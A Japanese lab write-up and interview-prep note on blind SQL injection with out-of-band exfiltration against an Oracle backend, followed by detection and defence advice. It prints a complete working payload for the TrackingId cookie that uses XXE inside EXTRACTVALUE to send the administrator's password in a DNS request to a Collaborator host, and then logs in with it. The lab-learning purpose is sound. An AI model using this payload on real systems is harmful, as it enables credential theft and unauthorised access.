## Lab: Blind SQL injection with out-of-band data exfiltration

---



## 1. どんな脆弱性か（What）
- **Blind SQL Injection（Out-of-band exfiltration）**
- アプリが SQL 内で **XML 関数（EXTRACTVALUE / XMLType）** を使用しており  
  → **外部エンティティ（XXE）を悪用した DNS リクエスト生成** が可能
- レスポンスにエラーが出ないため、**通常のエラーベース・タイムベースが効かない環境**

**特徴**
- データはレスポンスに出ない  
- 代わりに **DNS / HTTP などの外部チャネル** に流出する

---

## 2. どう気づくか（How to detect）
あなたの実務的な視点に合わせて、気づきのポイントを整理。

- Cookie の `TrackingId` が **SQL 文に連結されている挙動**を確認
- 通常の `'` や `'||'` に対して挙動が変化  
  → **サニタイズが弱い可能性**
- `EXTRACTVALUE` や `XMLType` を使うアプリは  
  → **外部エンティティを読み込む可能性がある**
- レスポンスに変化がない  
  → **Blind SQLi の可能性**
- Burp Collaborator を使うと  
  → **DNS リクエストが飛ぶかどうかで確定**

---

## 3. どう攻撃するか（Attack flow）
あなたが書いた手順を、面接用に整理して説明できる形にしたもの。

### 攻撃の流れ
1. `TrackingId` に SQLi を仕込む  
2. XML の外部エンティティ `%remote` に  
   **(SELECT password FROM users WHERE username='administrator')**  
   を埋め込む
3. その値をサブドメインとして DNS リクエストを発生させる
4. Burp Collaborator で DNS リクエストを受信  
5. ドメイン名に埋め込まれたパスワードを取得

### 攻撃ペイロード（概念）
```
UNION SELECT EXTRACTVALUE(
  xmltype('<!DOCTYPE ... SYSTEM "http://<password>.oastify.com">'),
  '/l'
)
```

### 攻撃の本質
- **アプリが外部ネットワークへアクセスできる**  
- **SQL 内で XML パーサが動く**  
- **Blind SQLi でもデータを外に出せる**

---

## 4. どう対策するか（Defense）
現場で使える対策を優先してまとめた。

### アプリケーション側
- **プリペアドステートメントの徹底**（SQL 文字列連結を禁止）
- **XML 外部エンティティ（XXE）の無効化**
- **EXTRACTVALUE / XMLType の使用を避ける**  
  → Oracle では非推奨

### インフラ側
- **DB サーバーから外部ネットワークへの outbound 通信を禁止**
- **DNS / HTTP の外向き通信を制限**
- **WAF / RASP で SQLi パターンを検知**

### 運用側
- **ログ監視**（異常な DNS リクエスト）
- **Collaborator 系の OOB チャネルを検知する IDS**

---

## 5. 全体像（図解）

```
[攻撃者] 
   ↓ SQLi
[Webアプリ] 
   ↓ XML 外部エンティティ
[DBサーバー]
   ↓ DNSリクエスト（パスワード入り）
[攻撃者のCollaborator]
```

## 🎤 まとめ

> **「この脆弱性は Blind SQL Injection で、アプリが外部リソースを参照する XML 関数（EXTRACTVALUE / XMLType）を使っている点に気づきました。  
> エラーメッセージが返らないため、DNS などの外部チャネルを使った Out-of-band exfiltration が可能だと判断しました。  
> 攻撃では、パスワードをサブドメインに埋め込んだ DNS リクエストを Collaborator で受信し、機密情報を取得できます。  
> 対策は、プリペアドステートメントの徹底、XML 外部エンティティの無効化、外部ネットワークアクセスの制限、WAF での検知です。」**


---

# # 🧪 Lab: Blind SQL Injection with Out-of-band Data Exfiltration  
**（DNS 経由でパスワードを抜き取る Blind SQLi）**

---

# ## 🎯 目的
- Blind SQL Injection を利用し、レスポンスにデータが返らない状況でも  
  **DNS 経由で機密情報（管理者パスワード）を外部に送信させる**
- Burp Collaborator を使って **Out-of-band (OOB) 通信** を検知する

---

# ## 📝 手順（詳細版）

---

# ## Step 1: リクエストをキャプチャする

### 1. ブラウザでターゲットのトップページへアクセス  
アプリはアクセス時に Cookie に `TrackingId` をセットしてくる。

例：
```
Cookie: TrackingId=xyz123abc
```

### 2. Burp Suite でリクエストを確認  
- Proxy → HTTP history  
- トップページのリクエストを右クリック → **Send to Repeater**

### 3. Repeater でパラメータを確認  
`TrackingId` が SQL に連結されている可能性があるため、  
ここに SQLi を仕込む。

---

# ## Step 2: Collaborator のサブドメインを取得

1. Burp の **Collaborator Client** を開く  
2. **Copy to clipboard** を押して、  
   `abc123.oastify.com` のような一意のサブドメインを取得

このドメインに DNS リクエストが来れば、  
**サーバーが外部にアクセスした証拠** となる。

---

# ## Step 3: ペイロードを作成して送信

Blind SQLi ではレスポンスに結果が出ないため、  
**DNS リクエストにパスワードを埋め込んで送信させる**。

### 🔥 使用するテクニック
- UNION-based SQLi  
- Oracle の `EXTRACTVALUE()` + `XMLType()`  
- 外部エンティティ（XXE）を利用した DNS リクエスト生成  
- OOB exfiltration（Out-of-band データ流出）

---

### 📌 完成ペイロード（TrackingId に挿入）

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(
  xmltype('<?xml version="1.0"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM
    "http://'||(SELECT password FROM users WHERE username='administrator')||'.abc123.oastify.com/">
    %remote;
  ]>'),'/l'
)+FROM+dual--
```

### 🧠 ペイロードの動作イメージ

1. `SELECT password FROM users WHERE username='administrator'`  
   → DB が管理者パスワードを取得

2. その値を  
   ```
   http://<password>.abc123.oastify.com/
   ```
   のような URL に埋め込む

3. XML パーサが外部エンティティ `%remote` を読み込む際に  
   **DNS リクエストが発生**

4. その DNS リクエストが Burp Collaborator に届く

---

# ## Step 4: Collaborator で DNS リクエストを受信

1. Collaborator Client → **Poll now** をクリック  
2. DNS リクエスト一覧に以下のようなドメインが現れる：

```
s3cr3tpass.abc123.oastify.com
```

### 🔍 ここが重要
- `s3cr3tpass` が **DB から抽出されたパスワード**
- これで Blind SQLi でもデータを取得できる

---

# ## Step 5: 管理者ログイン

取得したパスワードを使ってログイン：

```
username: administrator
password: s3cr3tpass
```

---

# ## 🧭 全体の攻撃フロー（図解）

```
[攻撃者]
    ↓ TrackingId に SQLi
[Webアプリ]
    ↓ SQL 内で XML パーサが実行
[DBサーバー]
    ↓ 外部エンティティを解決しようとする
    ↓ DNS リクエスト発生
[Burp Collaborator]
    ↓ パスワード入りの DNS を受信
[攻撃者]
    ↓ パスワードを取得してログイン
```

---

# ## 🛡️ 対策

### アプリケーション側
- **プリペアドステートメントの徹底**
- SQL 内で XML 関数（EXTRACTVALUE / XMLType）を使わない
- XXE（外部エンティティ）を無効化

### インフラ側
- **DB サーバーの外部通信（DNS/HTTP）を禁止**
- WAF で SQLi パターンを検知

### 運用側
- 異常な DNS トラフィックの監視
- OOB 通信を検知する IDS/IPS

---

